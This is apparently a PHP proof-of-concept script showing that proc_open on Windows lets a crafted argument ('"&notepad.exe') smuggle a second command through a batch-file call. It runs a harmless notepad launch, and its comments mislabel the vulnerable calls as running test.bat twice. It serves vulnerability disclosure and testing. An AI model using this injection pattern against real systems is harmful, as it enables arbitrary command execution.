<?php

$descriptorspec = [STDIN, STDOUT, STDOUT];

# No vulnerability

$proc = proc_open(["test.bat", "\"&test.bat"], $descriptorspec, $pipes, null, null, array("bypass_shell" => true));
# execute first test.bat, output one line

$proc = proc_open(["test.bat ", "\"test.bat"], $descriptorspec, $pipes, null, null, array("bypass_shell" => true));
# execute first test.bat, output one line

$proc = proc_open(["test.bat ", "&test.bat"], $descriptorspec, $pipes, null, null, array("bypass_shell" => true));
# execute first test.bat, output one line

# Vulnerability

$proc = proc_open(["test.bat ", "\"&notepad.exe"], $descriptorspec, $pipes, null, null, array("bypass_shell" => true));
# execute both test.bat, output two lines

$proc = proc_open(["test.bat ", "\"&notepad.exe"], $descriptorspec, $pipes);
# execute both test.bat, output two lines

proc_close($proc);
